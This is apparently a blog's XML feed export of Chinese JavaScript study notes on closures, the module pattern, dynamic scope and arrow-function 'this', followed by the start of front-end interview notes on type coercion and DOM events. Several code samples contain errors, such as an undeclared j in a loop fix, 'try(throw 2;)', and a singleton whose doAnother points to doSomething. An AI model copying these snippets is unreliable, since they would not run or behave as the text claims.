从纯学术角度来讲，在上面的代码片段中，函数 bar() 具有一个涵盖 foo() 作用域的闭包（事实上，涵盖了它能访问的所有作用域，比如全局作用域）。也可以认为 bar() 封闭在了 foo() 作用域中，因为 bar() 嵌套在 foo() 内部。 但是通过这种方式定义的闭包不能直接进行观察，也无法明白这个代码片段中闭包是如何工作的，我们可以很容易地理解词法作用域，而闭包则隐藏在代码之后，没有那么容易理解。思考下面的代码： 123456789function foo()&#123; var a = 2; function bar()&#123; console.log(a); &#125; return bar;&#125;var baz = foo();baz(); // 2 这就是闭包的效果 函数 bar() 的词法作用域能够访问 foo() 内部作用域，然后将 bar() 函数本身当做一个值类型进行传递，字啊这个例子中，我们将 bar 所引用的函数本身当做返回值。在 foo() 执行后，其返回值（也就是内部的bar()函数）赋值给变量 baz 并调用 baz()，实际上只是通过不同的标识符引用调用了内部的函数 bar(); bar() 显然可以被正常执行。但是这个例子中，它在自己定义的词法作用域以外的地方执行。 在 foo 执行后，通常会期待 foo 的整个内部作用域被销毁，因为我们知道引擎有垃圾回收器用来释放不再使用的内存空间。由于看上去 foo() 的内容不会再被使用，所以很自然而然地会考虑对其进行回收。 而闭包的神奇之处正是可以阻止这个事情的发生。事实上内部作用域依然存在，因为没有被回收。bar()本身在使用这个作用域。 因为 bar() 所声明的位置，它拥有涵盖 foo 内部作用域的闭包，使得该作用域能够一直存活，以供 bar() 在之后任何时间进行引用。bar() 依然持有对该作用域的引用，而这个引用就叫做闭包。 因此，在几微秒之后变量 baz 被实际调用（调用内部函数 bar），不出意外它可以访问定义时的词法作用域，因此它可以访问变量 a. 这个函数在定义时的词法作用域以外的地方被调用。闭包使得函数可以继续访问定义时的词法作用域。当然无论使用何种方式对函数类型的值进行传递，当函数在别处被调用时都可以观察到闭包 123456789101112function foo()&#123; var a = 2; function baz()&#123; console.log(a); // 2 &#125; bar(baz)&#125;function bar(fn)&#123; fn(); //这就是闭包&#125;foo();// 把内部函数 baz 传递给 bar,当调用这个内部函数时（现在叫做 fn）,它涵盖的 foo() 内部作用域的闭包就可以观察到了，因为它能够访问 a 传递函数当然也可以是间接的 12345678910111213var fn;function foo()&#123; var a = 2; function baz()&#123; console.log(a); &#125; fn = baz;// 将 baz 分配给全局变量&#125;function bar()&#123; fn(); // 这就是闭包&#125;foo();bar(); // 2 无论通过何种手段将内部函数传递到所在的词法作用域以外，它都会保持对原始定义作用域的引用，无论在何处执行这个函数都会使用闭包。 现在我懂了123456function wait(message)&#123; setTimeout(function timer()&#123; console.log(message); &#125;,1000);&#125;wait('Hello,closure!'); 上面代码中，将一个内部函数传递给 setTimeout(..)。timer 具有涵盖 wait(..)作用域的闭包，因为还保有对变量 message 的引用。wait(..)执行 1000毫秒后，它的内部作用域并不会消失，timer 函数依然保有 wait(..)作用域的闭包。在引擎内部，内置的工具函数 setTimeout(..)持有对一个参数的引用，这个参数也许叫做 fn 或者 func ，或者其他类似的名字。引擎会调用这个函数，在例子中就是内部的 timer 函数，而词法作用域正在这个过程中保持完整。 这就是闭包。下面用jq写一个例子 1234567function setupBot(name,selector)&#123; $(selector).click(function activator()&#123; console.log('Activating:' + name); &#125;);&#125;setupBot("Closure Bot1","#bot_1");setupBot("Closure Bot2","#bot_2"); 本质上无论何时何地，如果将(访问它们各自词法作用域的)函数当做第一级的值类型并到处传递，就会看到闭包在这些函数中的应用。在定时器，事件监听器，Ajax请求，跨窗口通信，Web Workers 或者任何其他的异步（或者同步）任务中，只要使用了回调函数，实际上就是在使用闭包。 之前介绍的 IIFE 模式，通常认为 IIFE是典型的闭包例子，但根据先前对闭包的定义，作者不是很同意这个观点 1234var a = 2;(function IIFE()&#123; console.log(a);&#125;)() 虽然这段代码可以正常工作，但严格来讲并不是闭包。因为函数并不是在它本身的词法作用域以外执行的。它在定义所在的作用域中执行（而外部作用域，也就是全局作用域中也持有 a）.a 是通过普遍的词法作用域查找而非闭包被发现的。 尽管 IIFE 本身并不是观察闭包的恰当例子，但它的确创建了闭包，并且也是最常见用来创建可以被封闭起来的闭包的工作。因为 IIFE 的确同作用域息息相关，即使本身并不会真的创建作用域。 循环和闭包说明闭包，for 循环是常见的例子 12345for(var i = 1; i &lt;= 5; i++)&#123; setTimeout(function timer()&#123; console.log(i); &#125;,i * 1000);&#125; 上面的代码会输出五次6。延迟函数的回调会在循环结束时执行。事实上，当定时器运行时即使每个迭代中执行的是 setTimeout(…,0)，所有的回调函数依然是在循环结束后才会被执行，因为会输出一个6来。 代码中这种缺陷导致它的行为同语义所暗示的不一样，这种缺陷是我们试图假设循环中的每个迭代在运行时都会给自己“捕获”一个i的副本。但是根据作用域的工作原理，实际情况是尽管循环中的五个函数是在各个迭代中分别定义的，但是它们都被封闭在一个共享的全局作用域中，因为实际上只有一个i。 这种情况，我们就需要更多闭包作用域，特别是在循环的过程中每个迭代都需要一个闭包作用域。 1234567891011121314151617181920212223242526for(var i = 1; i &lt;= 5; i++)&#123; (function()&#123; setTimeout(function timer()&#123; console.log(i); &#125;,i *1000); &#125;)();&#125;// 上面代码会在5秒内输出5个6.每个延迟函数都会将 IIFE 在每次迭代中创建的作用域封闭起来。但是这个作用域是空的，需要传值进去// 方法一for(var i = 1; i &lt;= 5; i++)&#123; (function()&#123; var j = i; setTimeout(function timer()&#123; console.log(j); &#125;,j *1000); &#125;)();&#125;// 方法二for(var i = 1; i &lt;= 5; i++)&#123; (function()&#123; setTimeout(function timer()&#123; console.log(j); &#125;,j *1000); &#125;)(i);&#125; 在迭代内使用IIFE 会每个迭代都生成一个新的作用域，使得延迟函数的回调将新的作用域封闭在每个迭代内部，每个迭代中都会含有一个具有正确值的变量供我们访问。 重返块作用域我们使用 IIFE 在每次迭代时都创建一个新的作用域，换句话说，每次迭代我们都需要一个块作用域。上面将讲到了 let 声明，可以用来劫持块作用域，并且在这个块作用域中声明一个变量。 本质上这是讲一个块转换成一个可以被关闭的作用域，可以看看下面的代码： 123456for(var i = 1; i &lt;= 5; i++)&#123; let j = i; // 闭包的作用域 setTimeout(function timer()&#123; console.log(j); &#125;,j * 1000);&#125; 但是，这不是全部，for 循环头部的 let 声明还会有一个特殊的行为，这个行为指出的变量在循环的过程中不止被声明一次，每次迭代都会声明，随后的迭代都会使用上一个迭代结束时的值来初始化这个变量。 12345for(let i = 1; i &lt;= 5; i++)&#123; setTimeout(function timer()&#123; console.log(i); &#125;,i * 1000);&#125; 模块还有其他的代码模式利用闭包的强大威力，但从表面看，它们似乎与回调无关，其中最强大的一个：模块 12345678910function foo()&#123; var something = 'cool'; var another = [1,2,3]; function doSomething()&#123; console.log(something); &#125; function doAnother()&#123; console.log(another.join("!")); &#125;&#125; 正如这段代码中看到的，这里并没有明显的闭包，只有两个私有数据变量 something 和 another，以及 doSomething（） 和 doAnother（）两个内部函数，它们的词法作用域（而这就是闭包）也就是 foo 内部作用域。 思考下面的代码： 12345678910111213141516function CoolModule()&#123; var something = 'cool'; var another = [1,2,3]; function doSomething()&#123; console.log(something); &#125; function doAnother()&#123; console.log(another.join("!")); &#125; return &#123; doSomething,doAnother &#125;&#125;var foo = CoolModule();foo.doSomething(); // coolfoo.doAnother(); // 1!2!3 这个模式在 JavaScript 中被称为模块，能常见的实现模块模式的方法通常被称为模块包楼。 首先，CoolModule() 只是一个函数，必须要通过调用它来创建一个模块实例，如果不执行内部函数，内部作用域和闭包都无法被创建。 其次，CoolModule() 只返回一个用对象字面量语法{key:value…}来表示的对象。这个返回的对象中含有对内部函数而不是内部数据变量的引用。我们保持内部数据变量是隐藏且私有的状态，可以将这这个对象类型的返回值看作是本质上是模块的公共 API 这个对象类型的返回值最终被赋值给外部的变量 foo ，然后就可以通过它来访问 API 中的属性方法，比如 foo.doSomething(); 从模块中返回一个实际的对象不是必须的，也是可以直接返回一个内部函数。JQ 就是一个很好的例子。JQ 和 $ 标识符就是 JQ 模块的公共 API ，但它们本身都是函数（由于函数也是对象，它们本身也可以拥有属性） doSomething 和 doAnother 函数具有涵盖模块实力内部作用域的闭包（通过调用 CoolModule 实现）。当通过返回一个含有属性引用的对象的方式来将函数传递到词法作用域外部时。我们就已经创建了可以观察和实践的闭包的条件了。 模块模式需要具备两个条件： 必须有外部分封闭函数，改函数必须至少被调用一次（每次调用会创建一个新的模块实例） 封闭函数必须返回至少一个内部函数，这样内部函数才能在私有的作用域中形成闭包，并且可以访问或者修改私有的状态。 一个具有函数属性的对象本身并不是真正的模块。从方便观察的角度看，一个从函数调用所返回的，只有数据属性而没有闭包函数的对象并不是真正的模块。 上面的实例代码都有一个叫做 CoolModule 的独立的模块创建器，可以被调用任意多次，每次调用都会创建一个新的模式实例。当只需要一个实例时，可以对这个模式进行简单的改进实现单例模式： 1234567891011121314151617var foo = (function CoolModule()&#123; var something = "cool"; var another = [1,2,3]; function doSomething()&#123; console.log(something); &#125; function doAnother()&#123; console.log(another.join("!")); &#125; return &#123; doSomething:doSomething, doAnother:doSomething &#125;&#125;)();foo.doSomething(); // cool foo.doAnother(); // 1!2!3 我们将模块函数转换成了 IIFE ，立即调用这个函数并返回值直接赋值给单例的模块实例标识符 foo 。 模块也普通函数，所以也可以接受参数： 123456789101112function CoolModule(id)&#123; function identify()&#123; console.log(id); &#125; return&#123; identify:identify &#125;&#125;var foo1 = CoolModule("foo 1");var foo2 = CoolModule("foo 2");foo1.identify(); // "foo 1"foo2.identify(); // "foo 2" 模块模式另一个简单但强大的用法是命名将要作为公共 API 返回的对象： 123456789101112131415161718192021var foo = (function CoolModule(id)&#123; function change()&#123; // 修改公共 API publicAPI.identify = identify2; &#125; function identify()&#123; console.log(id); &#125; function identify2()&#123; console.log(id.toUpperCase()); &#125; var publicAPI = &#123; change:change, identify:identify &#125; return publicAPI&#125;)("foo module");foo.identify(); // foo modulefoo.change();foo.identify(); // FOO MODULE 通过在模块实例的内部保留对公共 API 对象的内部引用，可以从内部对模块实例进行修改，包括添加或删方法和属性，以及修改它们的值。 现代的模块机制大多数模块依赖加载器/管理器本质上都是讲这种模块定义封装进一个友好的 API ，这里并不会研究某个具体的库，讲一些核心概念： 12345678910111213141516var MyModule = (function Manager()&#123; var modules = &#123;&#125;; function define(name,deps,impl)&#123; for(var i = 0; i &lt; deps.length; i++)&#123; deps[i] = modules[deps[i]]; &#125; modules[name] = impl.apply(impl,deps); &#125; function get(name)&#123; return modules[name]; &#125; return&#123; define:define, get:get &#125;&#125;)(); 这段代码的核心是 modules[name] = impl.apply(impl,deps); 为了模块的另一引入了包装函数（可以传入任何依赖），并且将返回值，也就是模块的 API ，存储在一个根据名字来管理的模块列表中。 下面展示了如何使用它来定义模块： 123456789101112131415161718192021222324MyModule.define("bar",[],function()&#123; function hello(who)&#123; return `Let me introduce: $&#123;who&#125;` &#125; return &#123; hello:hello &#125;&#125;);MyModule.define("foo",["bar"],function(bar)&#123; var hungry = "hippo"; function awesome()&#123; console.log(bar.hello(hungry).toUpperCase()); &#125; return&#123; awesome:awesome &#125;&#125;);var bar = MyModule.get("bar");var foo = MyModule.get("foo");console.log(bar.hello('hippo')); //Let me introduce:hippofoo.awesome(); //LET ME INTRODUCE:HIPPO “foo”和“bar”模块都是通过一个返回公共 API 的函数来定义的。“foo”甚至接受“bar”的实例作为依赖参数，并能相应地使用它。 模块就是模块，即使在它们外层加上一个友好的包装功能也不会发生任何变化。 未来（或现在）的模块机制ES6 为模块增加了一一级语法支持，在同个模块系统进行加载的时候，ES6会将文件当做独立的模块来处理。每个模块都可以导入其他模块或者特定的 API成员，同样也可以导出自己的 API 成员。 基于函数的模块并不是一个能够静态识别的模式（编辑器无法识别），它们的 API 语义只有在运行时才会被考虑进来，因为可以在运行时修改一个模块的 API。相比之下，ES6 模块 API 是静态的（API 不会在运行时改变）。由于编辑器知道这一点，因为可以在编译期检查对导入模块的 API 成员的引用是否真实存在，如果 API 引用并不存在，编译器会在编译时就抛出”早期“错误，而不是等到运行时再动态解析（并且报错） ES6 的模块没有 “行内”格式，必须定义在独立的文件中（一个文件一个模块）。浏览器或引起一个默认的“模块加载器”（可以被重载）可以在导入模块时同时加载文件。举个例子： 123456789101112131415161718192021// bar.jsfunction hello(who)&#123; return "Let me introduce:" + who;&#125;export hello;// foo.js// 仅从“bar”模块导入 hello()import hello from "bar";var hungry = "hippo";function awesome()&#123; console.log(hello(hungry).toUpperCase());&#125;export awesome;//baz.js// 导入完整的 “foo” 和 “bar”模块module foo from "foo";module bar from "bar";console.log("rhino");foo.awesome(); import 可以将一个模块中的一个或多个 API 导入到当前作用域中，并分别绑定在一个变量上。module 会将整个模块的 API 导入并绑定到一个变量上（foo,bar）。export 会将当期模块的一个标识符（变量。函数）导出为公共 API，这些操作可以在模块定义中根据需要使用任意多次。 模块文件中的内容会被当做包含在作用域闭包中一样来处理，就跟前面介绍的函数闭包模块一样。 小结当函数可以记住并访问所在的词法作用域，即使函数是在当前词法作用域之外执行，这时就产生了 闭包。 在循环中，闭包是一个强大的工具，可以用多种形式来实现模块等模式。 模块有两个主要的特征：（1）为创建内部作用域而调用了一个包装函数；（2）包装函数的返回值至少包含一个对内部函数的引用，这样就可以创建涵盖整个包装函数内部作用域的闭包。 附录动态作用域比对了动态作用和词法作用域模型，JavaScript 中的作用域就是词法作用域（事实上大部分语言都是基于词法作用域的）。 下面简要分析一下动态作用域，重申它与词法作用域的区别，但实际上动态作用域是 JavaScript 另一个重要的机制 this 标签。 词法作用域是一套基于引擎如何寻找变量已经会在何处找到变量的规则。词法作用域最重要的特性是它的定义过程发生代码的书写阶段（假设你没有使用 eval() 或者 with） 动态作用域似乎暗示有很好的理由让作用域作为一个在运行时就被动态确定的形式，而不是在写代码时进行静态确定的形式，事实上也是这样的，我们通过实例代码来说明： 123456789function foo()&#123; console.log(a);&#125;function bar()&#123; var a = 3; foo();&#125;var a = 2;bar(); 词法作用域让 foo() 中的 a 通过 RHS 引用到了全局作用域中的 a ,因此会输出 2。 而动态作用域并不关心函数和作用域是如何声明以及在何处声明的。只关心它们从何处调用。换句话说，作用域链是基于栈的，而不是代码中的作用域嵌套。 因此，如果 JavaScript 具有动态作用域，理论上，下面代码中的 foo() 在执行时将会输出 3 123456789function foo()&#123; console.log(a); //3&#125;function bar()&#123; var a = 3; foo();&#125;var a = 3;bar(); 上面的例子中，因为当 foo ()无法找到 a 变量引用时，会顺着调用栈在调用 foo() 的地方查找 a ，而不是在嵌套的词法作用域链中向上查找，由于 foo() 是在 bar() 中调用的，引擎会检查 bar() 的作用域，并在其中找到值为3的变量 a. 需要明确的是 JavaScript 并不具有动态作用域，它只有词法作用域，但是 this 机制某种程度上很像动态作用域。 主要区别：词法作用域是在写代码或者说定义时确定的，而动态作用域是在运行时确定的。（this也是）才发作用域关注函数在何处声明，而动态作用域关注函数从何处调用。 最后，this 关注函数如何调用，这就表明了 this 机制和动态作用域之间关系的紧密。 块作用域的替代方案如果我们想在 ES6 之前环境中使用块级作用域？ 思考下面的代码： 12345&#123; let a = 2; console.log(a); // 2&#125;console.log(a); //ReferenceError 这段代码在 ES6 环境中可以正常工作，但是之前的环境怎么实现这个效果呢？ 答案是用 catch 1234try(throw 2;)catch(a)&#123; console.log(a); // 2&#125;console.log(a); // ReferenceError 我们看到一个会强制抛出错误的 try/catch ，但是它抛出的错误就是一个值2，然后 catch 分句中的变量声明会接受这个值。另外还可以使用代码工具来做处理 TraceurGoogle 维护者一个名为 Traceur 的项目，该项目正是用来将 ES6 代码转换成兼容 ES6 之间的环境（大指的是 ES5，但不是全部）。下面是转换的代码的样子： 123456789&#123; try&#123; throw undefined; &#125;catch(a)&#123; a = 2; console.log(a); &#125;&#125;console.log(a); 通过使用这样的工具，我们就可以在使用块作用域时无需考虑目标平台是否是 ES6环境，因为 try/catch 从 ES3开始就存在了（并且一直是这样工作的） 隐式和显式作用域1234let (a = 2)&#123; console.log(a); // 2&#125;console.log(a); //ReferenceError 同隐式地劫持一个已经存在的作用域不同，let 声明会创建一个显示的作用域与其进行绑定。显式作用域不仅更加突出，在代码重构也表现得更加健壮。在语法上，通过强制性地将所有变量声明提升到块的顶部来产生更简洁的代码，这样更容易判断变量是否属于某个作用域。 这种模式同很多人在函数作用域中手动将 var 声明提升到函数顶部的方式很接近。let 声明有意将声明放在块的顶部，如果你并没有到处使用 let 定义，那么你块作用域就很容易辨识和维护。 但是这里有一个问题，let 声明并不包含在 ES6 中，官方的 Traceur 编辑器也不接受这中形式的代码，我们有两种选择，使用合法的ES6 代码并且在代码规范上做一些妥协 12345/*let*/&#123; let a = 2; console.log(a);&#125;console.log(a); // ReferenceError 性能try/catch 的性能的确很糟糕。因为将一段代码的任意一部分拿出来用函数进行包裹，会改变这段代码的含义，其中的 this/return/break和 continue 都会发生变化。IIFE 并不是一个普适的解决方案，它只适合在某些情况下进行手动操作。 this 词法ES6 添加了一个特殊语法形式用于函数说明，叫做箭头函数： 1234var foo = a =&gt;&#123; console.log(a);&#125;foo(2) // 2 箭头通常被当作 function 关键字的缩写。 12345678910var obj = &#123; id:"awesome", cool:function coolFn()&#123; console.log(this.id); &#125;&#125;var id = "not awesome";obj.cool(); // awesomesetTimeout(obj.cool,100); // not awesome 问题在于 cool() 函数丢失同 this 之间的绑定，解决这个问题有几种方式，但是最常用的是 var self = this; 1234567891011121314var obj = &#123; count:0, cool:function coolFn()&#123; var self = this; if(self.count &lt; 1)&#123; setTimeout(function timer()&#123; self.count++; console.log("awesome?"); &#125;,100); &#125; &#125;&#125;obj.cool(); // awesome? var self = this 这种解决方案圆满解决了理解和正确使用 this绑定的问题，并没有把问题过于复杂化，它使用的是我们熟悉的工具：词法作用域。self 只是一个可以通过词法作用域和闭包进行引用的标识符，不关心 this 绑定的过程中发生了什么。 ES6 中箭头函数引入了一个叫做 this 词法的行为： 12345678910111213var obj = &#123; count:0, cool:function coolFn()&#123; if(this.count &lt; 1)&#123; setTimeout(()=&gt;&#123; this.count++; console.log("awesome?"); &#125;,100); &#125; &#125;&#125;obj.cool(); // awesome? 简单地来说，箭头函数在涉及 this 绑定的行为和普通函数的行为完全不一致。它放弃了所有普通 this绑定的规定，取而代之的是当前的词法作用域覆盖了 this 本来的值。 因此，上面的代码的箭头函数并非是以某种不可预测的方式同所属的 this 进行了解绑定，而只是“继承” 了 cool 函数 的this 绑定（因此调用它不会出错） 另一个导致箭头函数不够理想的原因是它们的匿名函数而非是具名的。具名函数比较匿名函数更可取的原因在前面有三点。 在作者看来，解决这个问题的另一个更合适的方式是： 12345678910111213var obj = &#123; count:0, cool:function coolFn()&#123; if(this.count &lt; 1)&#123; setTimeout(function timer()&#123; this.count++; console.log("awesome?"); &#125;.bind(this),100); &#125; &#125;&#125;obj.cool(); // awesome?]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>你不知道的JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[前端面试题目汇总摘录（JS 基础篇）]]></title>
    <url>%2F%E5%89%8D%E7%AB%AF%E9%9D%A2%E8%AF%95%E9%A2%98%E7%9B%AE%E6%B1%87%E6%80%BB%E6%91%98%E5%BD%95-JS%20%E5%9F%BA%E7%A1%80%E7%AF%87.html</url>
    <content type="text"><![CDATA[温故而知新，保持空杯心态 JS 基础JavaScript 的 typeof 返回那些数据类型object number function boolean undefined string 12345678910111213141516typeof null; *// object*typeof isNaN; *// function*typeof isNaN(123); *//boolean*typeof []; *// object*Array.isArray(); *// false*toString.call([]); *// [object Array]*var arr = [];arr.constructor; *// ƒ Array() &#123; [native code] &#125;* 强制类型转换和隐式类型转换？显示转换（强制类型转换）js 提供了以下几种转型函数： 转换的类型 函数 数值类型 Number(mix),parseInt(string,radix),parseFloat(string); 字符串类型 toString(radix),String(mix) 布尔类型 Boolean(mix) Number（mix） 函数，可以将任意类型的参数 mix 转换为数值类型，规则为 如果是布尔值，true 和 false分别被转换为 1 和 0 如果是数字值，返回本身 如果是 null,返回 0. 如果是 undefined，返回 NaN 如果是字符串，遵循以下规则： 1. 如果字符串中只包含数字，则将其转换为十进制（忽略前导0，前面正负号有效）如果字符串中包含有效的浮点格式，则将其转换为对应的浮点数值（忽略前导0，前面正负号有效） 2. 如果字符串是空的（不包含任何字符），则将其转换为 0 3. 如果字符串中包含有效的十六进制格式，则转换为相同大小的十进制整数值 4. 如果字符串中包含上述格式之后的字符，则将其转换为 NaN 如果是对象，则调用对象的 valueOf() 方法，然后按照前面的规则进行转换返回的值，如果是转换结果是 NaN,则调用对象的 toString() 方法，然后再一次按照前面的规则进行返回的字符串值的转换 下表是对象的 valueOf() 的返回值 对象 返回值 Array 数组的元素被转换为字符串，这些字符串由逗号分隔，连接在一起。其操作与 Array.toString 和 Array.join 方法相同。 Boolean Boolean 值。 Date 存储的时间是从 1970 年 1 月 1 日午夜开始计的毫秒数 UTC Function 函数本身 Number 数字值 Object 对象本身。这是默认情况 String 字符串值 由于 Number（）函数在转换字符串时原理比较复杂，且不够合理，因此在处理字符串时，更常用的是 parseInt() 函数 parstInt(string,radix)将字符串转换为整数类型的数值，其规则： 忽略前面字符串前面的空格，直至找到第一个非空格字符 如果第一个字符不是数字字符或者负号，就会返回 NaN（也就是遇到空字符会返回 NaN） 如果第一个字符是数字字符，会继续解析第二个字符，知道解析完所有后续的字符或者是遇到一个非数字字符 如果字符串中第一个字符是数字字符，也能够识别各种进制 最好在 第二个参数指定转换的基数（进制），就不会有所歧义。 parseFloat(string)将字符串转换为浮点数类型的数值,规则： 与parseInt()函数类似，parseFloat()也是从第一个字符(位置0)开始解析每个字符。而且也是一直解析到字符串末尾，或者解析到遇见一个无效的浮点数字字符为止。也就是说，字符串中的第一个小数点是有效的，而第二个小数点就是无效的了，因此它后面的字符串将被忽略。 toString(radix)除 undefined 和 null之外的所有类型的值都具有 toString()方法，其作用是返回对象的字符串表示。 多数情况下，调用toString()方法不必传递参数。但是，在调用数值的toString()方法时，可以传递一个参数：输出数值的基数。默认情况下，toString()方法以十进制格式返回数值的字符串表示。 对象 操作 Array 将 Array 的元素转换为字符串。结果字符串由逗号分隔，且连接起来 Boolean 如果 Boolean 值是 true，则返回 “true”。否则，返回 “false” Date 返回日期的文字表示法 Error 返回一个包含相关错误信息的字符串 Function 返回如下格式的字符串，其中 functionname 是被调用 toString 方法函数的名称：function functionname( ) { [native code]} Number 返回数字的文字表示 String 返回 String 对象的值 默认 返回 “[object objectname]”，其中 objectname 是对象类型的名称 在不知道要转换的值是不是null或undefined的情况下，还可以使用转型函数String()，这个函数能够将任何类型的值转换为字符串。 String(mix)将任何类型的值转换为字符串，其规则为： 如果有toString()方法，则调用该方法（不传递radix参数）并返回结果 如果是null，返回”null” 如果是undefined，返回”undefined” Boolean(mix)将任何类型的值转换为布尔值。 以下值会被转换为false：false、””、0、NaN、null、undefined，其余任何值都会被转换为true。 隐式转换（非强制转换类型）在某些情况下，即使我们不提供显示转换，Javascript也会进行自动类型转换，主要情况有： isNaN(mix)用于检测是否为非数值的函数. 经测试发现，该函数会尝试将参数值用 Number() 进行转换，如果结果为“非数值”则返回 true，否则返回 false。 递增递减操作符（包括前置和后置）、一元正负符号操作符（经过对比发现，其规则与Number()规则基本相同） 如果是包含有效数字字符的字符串，先将其转换为数字值（转换规则同 Number()），再执行加减1的操作，字符串变量变为数值变量。 如果是不包含有效数字字符的字符串，将变量的值设置为 NaN，字符串变量变成数值变量。 如果是布尔值 false，先将其转换为0再执行加减1的操作，布尔值变量编程数值变量。 如果是布尔值 true，先将其转换为1再执行加减1的操作，布尔值变量变成数值变量。 如果是浮点数值，执行加减1的操作。 如果是对象，先调用对象的 valueOf() 方法，然后对该返回值应用前面的规则。如果结果是 NaN，则调用 toString() 方法后再应用前面的规则。对象变量变成数值变量。 加法运算操作符加号运算操作符在Javascript也用于字符串连接符，所以加号操作符的规则分两种情况： 如果两个操作值都是数值，其规则为： 如果一个操作数为 NaN，则结果为 NaN 如果是 Infinity+Infinity，结果是 Infinity 如果是 -Infinity+(-Infinity)，结果是 -Infinity 如果是 Infinity+(-Infinity)，结果是 NaN. 如果是 +0+(+0)，结果为 +0 如果是 (-0)+(-0)，结果为 -0. 如果是 (+0)+(-0)，结果为 +0 如果有一个操作值为字符串，则： 如果两个操作值都是字符串，则将它们拼接起来 如果只有一个操作值为字符串，则将另外操作值转换为字符串，然后拼接起来2. 如果一个操作数是对象、数值或者布尔值，则调用toString()方法取得字符串值，然后再应用前面的字符串规则。 对于undefined和null，分别调用String()显式转换为字符串。 可以看出，加法运算中，如果有一个操作值为字符串类型，则将另一个操作值转换为字符串，最后连接起来。 乘除、减号运算符、取模运算符这些操作符针对的是运算，所以他们具有共同性：如果操作值之一不是数值，则被隐式调用Number()函数进行转换。具体每一种运算的详细规则请参考ECMAScript中的定义。 逻辑操作符（!、&amp;&amp;、||）逻辑非（！）操作符首先通过Boolean()函数将它的操作值转换为布尔值，然后求反。 逻辑与（&amp;&amp;）操作符，如果一个操作值不是布尔值时，遵循以下规则进行转换： 如果第一个操作值经 Boolean() 转换后为 true，则返回第二个操作值，否则返回第一个值（不是Boolean() 转换后的值） 如果第一个操作值是对象，则返回第二个操作值 如果两个操作值都是对象，则返回第二个操作值 如果有一个操作值为 null，返回 null 如果有一个操作值为 NaN，返回 NaN 如果有一个操作值为 undefined，返回 undefined 逻辑或（||）操作符，如果一个操作值不是布尔值，遵循以下规则 如果第一个操作值经 Boolean() 转换后为 false，则返回第二个操作值，否则返回第一个操作值（不是Boolean() 转换后的值） 如果两个操作值都是对象，则返回第一个操作值 如果两个操作值都为 null，返回 null 如果两个操作值都为 NaN，返回 NaN 如果两个操作值都为 undefined，返回 undefined 关系操作符（&lt;, &gt;, &lt;=, &gt;=）与上述操作符一样，关系操作符的操作值也可以是任意类型的，所以使用非数值类型参与比较时也需要系统进行隐式类型转换： 如果两个操作值都是数值，则进行数值比较 如果两个操作值都是字符串，则比较字符串对应的字符编码值 如果只有一个操作值是数值，则将另一个操作值转换为数值，进行数值比较 如果一个操作数是对象，则调用 valueOf() 方法（如果对象没有 valueOf() 方法则调用toString() 方法），得到的结果按照前面的规则执行比较 如果一个操作值是布尔值，则将其转换为数值，再进行比较 注：NaN 是非常特殊的值，它不和任何类型的值相等，包括它自己，同时它与任何类型的值比较大小时都返回 false。 相等操作符（==）相等操作符会对操作值进行隐式转换后进行比较： 如果一个操作值为布尔值，则在比较之前先将其转换为数值 如果一个操作值为字符串，另一个操作值为数值，则通过Number()函数将字符串转换为数值 如果一个操作值是对象，另一个不是，则调用对象的 valueOf() 方法，得到的结果按照前面的规则进行比较 null与undefined是相等的 如果一个操作值为 NaN，则相等比较返回 false 如果两个操作值都是对象，则比较它们是不是指向同一个对象 split()、join()的区别前者是切割成数组的形式 后者是将数组转换为字符串 数组方法pop/push/unshift/shift 数组方法 描述 pop() 删除原数组最后一项，并返回删除元素的值；如果数组为空则返回undefined push() 将参数添加到原数组末尾，并返回数组的长度 unshift() 将参数添加到原数组开头，并返回数组的长度 shift() 删除原数组第一项，并返回删除元素的值；如果数组为空则返回undefined 事件绑定和普通事件有什么区别普通事件中的onclick是DOM0级事件只支持单个事件，会被其他onclick事件覆盖，而事件绑定中的addEventListener是DOM2级事件可以添加多个事件而不用担心被覆盖 普通添加事件的方法： 1234567const btn = document.getElementById("hello");btn.onclick = function()&#123; alert(1);&#125;btn.onclick = function()&#123; alert(2);&#125; 执行上面的代码只会alert 2 事件绑定方式添加事件： 1234567const btn = document.getElementById("hello");btn.addEventListener("click",function()&#123; alert(1);&#125;,false);btn.addEventListener("click",function()&#123; alert(2);&#125;,false); 执行上面的代码会先alert 1 再 alert 2 IE 和 DOM 事件流有什么区别事件 HTML元素事件是浏览器内在自动产生的,当有事件发生时html元素会向外界(这里主要指元素事件的订阅者)发出各种事件,如click,onmouseover,onmouseout等等。 DOM事件流 DOM(文档对象模型)结构是一个树型结构，当一个HTML元素产生一个事件时，该事件会在元素结点与根结点之间的路径传播，路径所经过的结点都会收到该事件，这个传播过程可称为DOM事件流。 冒泡型事件(Bubbling) 这是IE浏览器对事件模型的实现。冒泡，顾名思义，事件像个水中的气泡一样一直往上冒，直到顶端。从DOM树型结构上理解，就是事件由叶子结点沿祖先结点一直向上传递直到根结点；从浏览器界面视图HTML元素排列层次上理解就是事件由具有从属关系的最确定的目标元素一直传递到最不确定的目标元素. 捕获型事件(Capturing) Netscape Navigator的实现，它与冒泡型刚好相反，由DOM树最顶层元素一直到最精确的元素，直观上的理解应该如同冒泡型，事件传递应该由最确定的元素，即事件产生元素开始。 DOM标准事件模型 因为两个不同的模型都有其优点和解释，DOM标准支持捕获型与冒泡型，可以说是它们两者的结合体。它可以在一个DOM元素上绑定多个事件处理器，并且在处理函数内部，this关键字仍然指向被绑定的DOM元素，另外处理函数参数列表的第一个位置传递事件event对象。 首先是捕获式传递事件，接着是冒泡式传递，所以，如果一个处理函数既注册了捕获型事件的监听，又注册冒泡型事件监听，那么在DOM事件模型中它就会被调用两次。 实例： 12345&lt;body&gt; &lt;div&gt; &lt;button&gt;点击这里&lt;/button&gt; &lt;/div&gt;&lt;/body&gt; 冒泡：button -&gt; div -&gt; body （IE 事件流） 捕获：body -&gt; div -&gt; button （Netscape事件流） DOM: body -&gt; div -&gt; button -&gt; button -&gt; div -&gt; body（先捕获后冒泡） 事件侦听函数的区别 1234567// IE使用: [Object].attachEvent("name_of_event_handler", fnHandler); //绑定函数 [Object].detachEvent("name_of_event_handler", fnHandler); //移除绑定 // DOM使用： [Object].addEventListener("name_of_event", fnHandler, bCapture); //绑定函数 [Object].removeEventListener("name_of_event", fnHandler, bCapture); //移除绑定 如何取消浏览器事件的传递与事件传递后浏览器的默认处理 取消事件传递是指，停止捕获型事件或冒泡型事件的进一步传递。 